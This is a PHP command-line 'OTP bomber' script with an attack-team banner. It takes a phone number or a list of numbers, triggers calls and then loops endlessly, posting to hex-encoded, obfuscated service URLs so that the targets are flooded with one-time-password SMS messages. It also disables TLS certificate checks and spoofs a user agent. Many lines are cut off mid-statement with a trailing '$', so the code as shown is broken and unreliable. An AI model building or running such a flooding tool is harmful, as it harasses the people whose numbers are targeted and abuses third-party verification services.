#!/usr/bin/env php
<?php
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '999999999M');
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = "";
    $RR = "";
    $G  = "";
    $GG = "";
    $B  = "";
    $BB = "";
    $Y  = "";
    $YY = "";
    $X  = "";
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x6$
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m";
    $ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andr$
    system('clear');
}
if(function_exists('pcntl_signal')) {
        declare(ticks = 1);
        function signal_handler($signal) {
        global $Y,$X;
        switch($signal) {
        case SIGTERM:
        die($Y."\n========================$
        case SIGKILL:
        die($Y."\n========================$
        case SIGINT:
        die($Y."\n========================$
        }
        }
        pcntl_signal(SIGTERM, "signal_handler");
        pcntl_signal(SIGINT, "signal_handler");
        }
        function post_data($url,$data) {
        global $ua;
        global $ua;
        $ch=curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1$
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data$
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0$
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0$
        return curl_exec($ch);
        curl_close($ch);
        }
        echo $Y.
        "
__        __   ____   _____
\ \      / /  / ___| |_   _|
 \ \ /\ / /  | |       | |
  \ V  V /   | |___    | |
   \_/\_/     \____|   |_|

echo $R."\n++++++++++++++++++++++++++++++++++++++";
echo $B."\nAuthor  : MrTuts4X                  ".$
echo $B."\nGithub  : https://github.com/BrushX	".$
echo $B."\nTeam    : W1ND CYB3R ATT4CK         ".$
echo $B."\nContact : tuts4x@gmail.com                       ".$
echo $B."\nDate    : 13-08-2018                 ".$
echo $R."\n++++++++++++++++++++++++++++++++++++++"$
isset($argv[1]) OR die($RR."[!] Input No List [!]\$
if(is_numeric($argv[1])) {
        echo "Calling     -> ".$G.$argv[1].$X."\n";
        post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2$
        while(1) {
                echo "Send OTP To -> ".$G.$argv[1]$
                post_data("\x68\x74\x74\x70\x3a\x2$
                post_data("\x68\x74\x74\x70\x73\x3$
        }
}
if(!file_exists($argv[1])) {
        die($RR."[!] File Not Exists [!]".$X."\n");
}
$argv[1]=explode("\n",file_get_contents($argv[1]));
$argv[1]=str_replace(' ','',$argv[1]);
foreach($argv[1] as $argv[2]):
echo "Calling     -> ".$G.$argv[2].$X."\n";
        post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2$
endforeach;
while(1) {
foreach($argv[1] as $argv[2]):
echo "Send OTP To -> ".$G.$argv[2].$X."\n";
        post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x7$
        post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2$
endforeach;
}